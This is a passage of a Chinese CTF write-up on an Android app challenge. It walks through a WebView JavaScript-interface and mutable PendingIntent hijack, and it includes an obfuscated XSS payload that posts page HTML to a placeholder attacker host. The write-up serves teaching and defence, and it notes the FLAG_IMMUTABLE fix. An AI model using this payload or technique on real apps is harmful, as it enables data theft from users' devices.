class="string">&quot;@xml/file_paths&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><p>跟easydroid一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.mediumdroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebViewClient;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            data = Uri.parse(<span class="string">&quot;http://app.toutiao.com/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (data.getAuthority().contains(<span class="string">&quot;toutiao.com&quot;</span>) &amp;&amp; data.getScheme().equals(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">            webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>() &#123; <span class="comment">// from class: com.bytectf.mediumdroid.MainActivity.1</span></span><br><span class="line">                <span class="meta">@Override</span> <span class="comment">// android.webkit.WebViewClient</span></span><br><span class="line">                <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">                    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(url);</span><br><span class="line">                    <span class="keyword">if</span> (uri.getScheme().equals(<span class="string">&quot;intent&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            MainActivity.<span class="built_in">this</span>.startActivity(Intent.parseUri(url, <span class="number">1</span>));</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, url);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            setContentView(webView);</span><br><span class="line">            webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">            webView.loadUrl(data.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="FlagReceiver"><a href="#FlagReceiver" class="headerlink" title="FlagReceiver"></a>FlagReceiver</h3><p>跟之前一样接受flag写到一个目录下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.mediumdroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), <span class="string">&quot;flag&quot;</span>);</span><br><span class="line">            writeFile(file, flag);</span><br><span class="line">            Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:7:0x0016 -&gt; B:23:0x0026). Please submit an issue!!! */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(File file, String s)</span> &#123;</span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer = <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file, <span class="literal">true</span>);</span><br><span class="line">                    writer.write(s);</span><br><span class="line">                    writer.write(<span class="number">10</span>);</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                        writer.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e2) &#123;</span><br><span class="line">                e2.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">            <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e3) &#123;</span><br><span class="line">                    e3.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> th;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TestActivity"><a href="#TestActivity" class="headerlink" title="TestActivity"></a>TestActivity</h3><p>这里跟上题不一样的点在于webView.addJavascriptInterface(this, “jsi”);和Te3t方法</p><p>addJavascriptInterface的作用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webView.addJavascriptInterface(javaObject, &quot;jsi&quot;);</span><br></pre></td></tr></table></figure><p>意思是：<strong>把一个 Java 对象暴露给 WebView 里的 JavaScript 使用</strong></p><ul><li>this → 当前 TestActivity实例</li><li>“jsi” → JavaScript 中访问这个对象的名字</li></ul><blockquote><p>这意味着可以在WebView渲染的网页中使用js调用Android类中的方法，但是前提必须要在可以使用js接口调用的方法前面加上@JavascriptInterface的声明，在该类中的Te3t即为可以使用js接口调用的方法。</p></blockquote><p>Te3t这个方法没有任何权限校验，参数 title &#x2F; content完全可控</p><p>要求是Android 8.0（API 26）后，须先创建 NotificationChannel 才能发通知，”CHANNEL_ID” 是后面 Builder 使用的 channel id，4等价于 IMPORTANCE_HIGH</p><p>通知标题，<strong>完全由 JS 控制</strong></p><blockquote><p>Te3t 则创建了一条通知，并且在创建通知的过程中使用PendingIntent.getBroadcast(this, 0, new Intent(), 0))， 该PendingIntent将执行一个广播操作，类似于调用Context.sendBroadcast()方法。通过获取这个PendingIntent，可以在任何时候以PendingIntent创建者APP的权限执行这个广播操作，而无需调用sendBroadcast()方法。方法原型public staticPendingIntent getBroadcast (Context context,int requestCode,Intent intent,int flags)</p></blockquote><p>普通 Intent 是什么？sendBroadcast(intent);</p><p>立刻发，只能由<strong>当前 App 自己</strong>发</p><p>PendingIntent 是什么？</p><blockquote><p><strong>一个授权凭证</strong>， 允许 <strong>别的进程 &#x2F; 系统</strong> 在以后以你的 App 身份执行一个 Intent</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.mediumdroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.app.NotificationChannel;</span><br><span class="line"><span class="keyword">import</span> android.app.NotificationManager;</span><br><span class="line"><span class="keyword">import</span> android.app.PendingIntent;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.webkit.JavascriptInterface;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> androidx.core.app.NotificationCompat;</span><br><span class="line"><span class="keyword">import</span> androidx.core.app.NotificationManagerCompat;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> getIntent().getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">        setContentView(webView);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.addJavascriptInterface(<span class="built_in">this</span>, <span class="string">&quot;jsi&quot;</span>);</span><br><span class="line">        webView.loadUrl(url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Te3t</span><span class="params">(String title, String content)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">26</span>) &#123;</span><br><span class="line">            <span class="type">NotificationChannel</span> <span class="variable">channel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationChannel</span>(<span class="string">&quot;CHANNEL_ID&quot;</span>, <span class="string">&quot;CHANNEL_NAME&quot;</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="type">NotificationManager</span> <span class="variable">notificationManager</span> <span class="operator">=</span> (NotificationManager) getSystemService(NotificationManager.class);</span><br><span class="line">            notificationManager.createNotificationChannel(channel);</span><br><span class="line">        &#125;</span><br><span class="line">        NotificationCompat.<span class="type">Builder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationCompat</span>.Builder(<span class="built_in">this</span>, <span class="string">&quot;CHANNEL_ID&quot;</span>).setContentTitle(title).setContentText(content).setSmallIcon(R.mipmap.ic_launcher).setContentIntent(PendingIntent.getBroadcast(<span class="built_in">this</span>, <span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">Intent</span>(), <span class="number">0</span>)).setAutoCancel(<span class="literal">true</span>).setPriority(<span class="number">1</span>);</span><br><span class="line">        <span class="type">NotificationManagerCompat</span> <span class="variable">nm</span> <span class="operator">=</span> NotificationManagerCompat.from(<span class="built_in">this</span>);</span><br><span class="line">        nm.notify(<span class="number">100</span>, builder.build());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PendingIntent"><a href="#PendingIntent" class="headerlink" title="PendingIntent"></a>PendingIntent</h3><p>Android 有三种 PendingIntent：</p><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td><code>getActivity()</code></td><td>启动 Activity</td></tr><tr><td><code>getService()</code></td><td>启动 Service</td></tr><tr><td><code>getBroadcast()</code></td><td><strong>发送广播</strong></td></tr></tbody></table><p>所以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PendingIntent.getBroadcast(...)</span><br></pre></td></tr></table></figure><p><strong>就是创建一个以后会被 sendBroadcast(intent)的凭证</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PendingIntent.getBroadcast(</span><br><span class="line">    <span class="built_in">this</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Intent</span>(),</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p> this：Context，表示：<strong>以 TestActivity当前 App 的身份</strong></p><p>requestCode &#x3D; 0：用于区分不同 PendingIntent，这里只有一个</p><p>new Intent() ：这是一个：空 Intent</p><p>flags &#x3D; 0：啥也没有</p><blockquote><p>A组件创建了一个 <code>PendingIntent</code>的对象然后传给 B组件，B 在执行这个 <strong>PendingIntent 的 send 时候，它里面的 Intent 会被发送出去</strong>，而接受到这个 Intent 的 C 组件会认为是 A 发的。<strong>B以A的权限和身份发送了这个Intent</strong>。</p><p>PendingIntent 是可变的，这意味着应用 B 可以按照 <a href="https://developer.android.google.cn/reference/android/content/Intent#fillIn(android.content.Intent,%20int)">fillIn()</a> 文档中所述的逻辑更新用于指定操作的内部 intent。换言之，恶意应用可能会修改未填充的 PendingIntent 字段，从而允许攻击者访问存在漏洞的应用中原本不支持导出的组件。</p><p>PendingIntent 之所以危险，是因为：创建它的 App 没把 Intent 填满，另一个 App 可以用 <code>fillIn()</code> 把空的地方补成恶意内容，然后系统会以原 App 身份执行这个 Intent。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fillIn()</span><br></pre></td></tr></table></figure><p>官方定义很绕，我们翻译成一句话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A.fillIn(B, flags)</span><br></pre></td></tr></table></figure><p>意思是：<strong>用 Intent B 的内容，去“补全” Intent A 中“还没设置的字段”</strong></p><p>核心规则只有一条：<strong>A 里已经设置过的字段，默认不能被覆盖A 里没设置的字段，可以被 B 填进去</strong></p></blockquote><p>如果其他APP能够修改PendingIntent 封装的Intent 则可能会导致危险的事情发生，例如上文提到的广播，通过修改Intent然后发送广播可能会使被攻击APP未导出的广播接收器收到广播，受到攻击</p><p>如果应用以 Android 6（API 级别 23）或更高版本为目标平台，请指定可变性。例如，可以通过使用 FLAG_IMMUTABLE 来防止恶意应用填充未填充的字段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PendingIntent</span> <span class="variable">pendingIntent</span> <span class="operator">=</span></span><br><span class="line">        PendingIntent.getActivity(</span><br><span class="line">            getContext(),</span><br><span class="line">            <span class="comment">/* requestCode= */</span> <span class="number">0</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Intent</span>(intentAction),</span><br><span class="line">            PendingIntent.FLAG_IMMUTABLE);</span><br></pre></td></tr></table></figure><p><strong>在 Android 11（API 级别 30）及更高版本中，必须指定要将哪些字段设置为可变字段，以缓解此类意外漏洞。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 Broadcast 关联的 PendingIntent</span></span><br><span class="line">PendingIntent.getBroadcast(Context context, <span class="type">int</span> requestCode, Intent intent, <span class="type">int</span> flags)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Activity 关联的 PendingIntent</span></span><br><span class="line">PendingIntent.getActivity(Context context, <span class="type">int</span> requestCode, Intent intent, <span class="type">int</span> flags)</span><br><span class="line">PendingIntent.getActivity(Context context, <span class="type">int</span> requestCode, Intent intent, <span class="type">int</span> flags, Bundle options)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Service 关联的 PendingIntent</span></span><br><span class="line">PendingIntent.getService(Context context, <span class="type">int</span> requestCode, Intent intent, <span class="type">int</span> flags)</span><br></pre></td></tr></table></figure><table><thead><tr><th>方法</th><th>将来系统替你做的事</th></tr></thead><tbody><tr><td><code>getActivity()</code></td><td><code>startActivity(intent)</code></td></tr><tr><td><code>getBroadcast()</code></td><td><code>sendBroadcast(intent)</code></td></tr><tr><td><code>getService()</code></td><td><code>startService(intent)</code></td></tr></tbody></table><blockquote><p>getBroadcast()是“提前把 sendBroadcast() 打包成一个凭证，真正发广播的是 sendBroadcast()，只是这个 sendBroadcast()是以后由系统代你执行的。</p><p>getActivity()的意思其实是，获取一个PendingIntent对象，而且该对象日后激发时所做的事情是启动一个新activity。也就是说，当它异步激发时，会执行类似Context.startActivity()那样的动作。相应地，getBroadcast()和getService()所获取的PendingIntent对象在激发时，会分别执行类似Context.sendBroadcast()和Context.startService()这样的动作。</p><p>PendingIntent 是系统对于待处理数据的一个引用，称之为：token；当主程序被 Killed 时，token 还是会继续存在的，可以继续供其他进程使用。如果要取消 PendingIntent，需要调用PendingIntent 的 cancel 方法。</p><p>Bundle options 是启动 Activity 时的额外启动参数，</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果新请求的 PendingIntent 发现已经存在时，取消已存在的，用新的 PendingIntent 替换</span></span><br><span class="line"><span class="type">int</span> FLAG_CANCEL_CURRENT</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果新请求的 PendingIntent 发现已经存在时，忽略新请求的，继续使用已存在的。日常开发中很少使用</span></span><br><span class="line"><span class="type">int</span> FLAG_NO_CREATE</span><br><span class="line"></span><br><span class="line"><span class="comment">//表示 PendingIntent 只能使用一次，如果已使用过，那么 getXXX(...) 将会返回 NULL </span></span><br><span class="line"><span class="comment">//也就是说同类的通知只能使用一次，后续的通知单击后无法打开。</span></span><br><span class="line"><span class="type">int</span> FLAG_ONE_SHOT</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果新请求的 PendingIntent 发现已经存在时, 如果 Intent 有字段改变了，这更新已存在的 PendingIntent</span></span><br><span class="line"><span class="type">int</span> FLAG_UPDATE_CURRENT</span><br></pre></td></tr></table></figure><table><thead><tr><th>Flag</th><th></th></tr></thead><tbody><tr><td><code>FLAG_CANCEL_CURRENT</code></td><td><strong>有旧的就删掉，重新创建</strong></td></tr><tr><td><code>FLAG_NO_CREATE</code></td><td><strong>只查不建，没有就返回 null</strong></td></tr><tr><td><code>FLAG_ONE_SHOT</code></td><td><strong>只能用一次，用完就失效</strong></td></tr><tr><td><code>FLAG_UPDATE_CURRENT</code></td><td><strong>有旧的就复用，并更新 Intent 内容</strong></td></tr></tbody></table><p>FLAG_CANCEL_CURRENT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PendingIntent.getBroadcast(ctx, 0, intentA, FLAG_CANCEL_CURRENT);</span><br><span class="line">PendingIntent.getBroadcast(ctx, 0, intentB, FLAG_CANCEL_CURRENT);</span><br></pre></td></tr></table></figure><p>结果：intentA 对应的 PendingIntent 被取消，intentB 成为新的</p><p>FLAG_NO_CREATE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PendingIntent pi = PendingIntent.getBroadcast(ctx, 0, intent, FLAG_NO_CREATE);</span><br></pre></td></tr></table></figure><p>如果存在 → 返回已有 PendingIntent</p><p>如果不存在 → 返回 null</p><p>FLAG_ONE_SHOT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PendingIntent pi = PendingIntent.getBroadcast(ctx, 0, intent, FLAG_ONE_SHOT);</span><br></pre></td></tr></table></figure><p>第一次 send() </p><p>第二次 send() （失效）</p><p>FLAG_UPDATE_CURRENT</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">i1.putExtra(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">PendingIntent.getBroadcast(ctx, <span class="number">0</span>, i1, FLAG_UPDATE_CURRENT);</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">i2.putExtra(<span class="string">&quot;a&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">PendingIntent.getBroadcast(ctx, <span class="number">0</span>, i2, FLAG_UPDATE_CURRENT);</span><br></pre></td></tr></table></figure><p>最终：extras &#x3D; { a &#x3D; 2 }</p><h2 id="攻击方案"><a href="#攻击方案" class="headerlink" title="攻击方案"></a>攻击方案</h2><p>跟easydroid一样先要利用MainActivity跳转到TestActivity</p><p>然后TestActivity中的webview加载由Intent Scheme Url传入的url，导致下一个恶意html被渲染，该HTML通过js接口调用Te3t触发通知创建PendingIntent</p><p>如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    jsi.<span class="title class_">Te3</span>t(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;test&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在攻击者APP中创建MagicService服务，用于监听通知，在获取到被攻击APP发出的通知后就可以获取到被攻击APP创建的PendingIntent</p><p>拿到PendingIntent后即可重新填充Intent，使其的Action设置为com.bytectf.SET_FLAG，并且添加flag参数将值设置为恶意html内容，然后使用send发送广播，当被攻击APP接收到广播后会设置flag，从而将恶意html内容插入到flag中，污染flag文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>);</span><br><span class="line">intent.setPackage(<span class="string">&quot;com.bytectf.mediumdroid&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">html</span> <span class="operator">=</span> <span class="string">&quot;&lt;img src=\&quot;x\&quot; onerror=\&quot;eval(atob(&#x27;eGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignUE9TVCcsICdodHRwOi8veHgueHh4Lnh4eC54eHg6eHh4JywgdHJ1ZSk7IHhoci5zZXRSZXF1ZXN0SGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJyk7IHhoci5zZW5kKCdodG1sPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50Lm91dGVySFRNTCkpOw==&#x27;))\&quot;&gt;&quot;</span>;</span><br><span class="line">intent.putExtra(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&lt;html&gt;&quot;</span> + html + <span class="string">&quot;&lt;/html&quot;</span>);</span><br></pre></td></tr></table></figure><p>当恶意代码被注入到flag中后在攻击者APP的数据目录创建软链接 